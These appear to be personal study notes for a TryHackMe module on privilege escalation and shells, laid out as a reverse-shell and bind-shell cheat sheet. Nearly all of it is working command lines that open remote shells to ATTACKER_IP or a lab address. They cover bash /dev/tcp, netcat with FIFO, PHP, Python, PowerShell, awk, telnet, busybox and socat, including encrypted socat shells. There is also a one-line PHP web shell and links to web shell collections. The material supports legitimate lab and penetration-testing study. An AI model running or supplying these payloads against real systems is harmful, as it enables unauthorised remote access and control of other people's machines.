- [Privilege Escalation - TryHackMe](https://tryhackme.com/r/module/privilege-escalation-and-shells)
- Tools:
	- netcat: nc, ncat
	- socat: netcat on steroids
	- metasploit - multi/handler - metasploit listener
	- msfvenom - payload generator
	- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
	- [PentestMonkey Reverse Shell cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), [pentestmonkey reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	- kali: **/usr/share/webshells**
	- code for shell: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
	- [socat static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

  
nc 10.17.27.198 1234 -e /bin/bash

---

## Reverse shell:

- Netcat

```sh
# netcat listener
nc -lvnp 443

# Connect to nectcat listener
nc <IP> 443
```

- FIFO
```sh
# Listener
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Connect to FIFO listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <port> >/tmp/f


# Reverse shell
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# bind shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

```

- TCP device stream
```sh

# using bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
# or
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5


# Starting shell using a different file descriptor
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done

# or
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196

```
  

- php
```php
# exec
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# shell_exec
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# system
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3”);'

# passthru
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3”);'

# popen
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'

```

- python
```sh
export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.27.198",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

 
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'


python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash”)’

```

- Powershell 

```powershell

$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
	};
	$client.Close()

```
  


- telnet
```sh
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
  

- awk

```sh
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
  

- busy box
```sh
busybox nc ATTACKER_IP 443 -e sh
```


## Shell variations
  
```sh
# Simple listener
nc lvnp 4444

# allows bash history and arrow keys
rlwrap nc -lvnp 443


# improved nc
ncat -lvnp 4444

# reverse shell with encryption
ncat --ssl -lvnp 4444

# socket connection
socat -d -d TCP-LISTEN:443 STDOUT
```

- Web shell
```php

<?php

if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
}
?>
```
  
**existing webshells:**

1. [**https://github.com/flozz/p0wny-shell**](https://github.com/flozz/p0wny-shell)
2. [**https://github.com/b374k/b374k**](https://github.com/b374k/b374k)
3. [**https://www.r57shell.net/single.php?id=13**](https://www.r57shell.net/single.php?id=13)
4. **list of webshells:** [**https://www.r57shell.net/index.php**](https://www.r57shell.net/index.php)



## Shell stabilization commands:


- python
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

 - rlwrap

```sh
# use netcat shell with rlwrap
rlwrap nc -lvnp <port>
```
  
  

- Make the shell compatible with current terminal

```sh

# this will give us access to term commands such as clear.
export TERM=xterm


# 1. Background the shell using Ctrl + Z. 
# 2. Back in our own terminal run below command
# This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C # to kill processes). It then foregrounds the shell, thus completing the process. 
stty raw -echo; fg


# Once done with the shell, run below command to restore the previous settings
reset

```

- Set terminal Size

```sh
# run in own terminal and note the rows and columns size
stty -a 


# in the reverse/bind shell
stty rows <number>
stty cols <number>

  ```


  

## Socat and shells

- Reverse Shell

```sh

# Simple listener
socat TCP-L:<port> -


# Connect to the above listener

# Connection on windows
# The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes


# Connection on Linux
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

  

```

- Bind shell

```sh

# Linux listener
socat TCP-L:<PORT> EXEC:"bash -li"


# Windows listener
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

  

# Connections
socat TCP:<TARGET-IP>:<TARGET-PORT> -

```

- Stable shell - only on linux
```sh
# Listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

# Eg. 
socat file:`tty`,raw,echo=0 tcp-listen:4444

  

# It should be connected only with below command
# -> pty, allocates a pseudoterminal on the target -- part of the stabilisation process
# -> stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
# -> sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
# -> setsid, creates the process in a new session
# -> sane, stabilises the terminal, attempting to "normalise" it.

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# Eg.
socat TCP:10.17.27.198:1111 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- Encrypted Reverse shell

```sh

# Create a cert
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem


# Reverse shell listener
# verify=0 : disable cert validation
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -


# connect to above listener
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

- Encrypted Reverse shell

```sh
# Bind shell listener
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Connect to above listener
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
  
```
  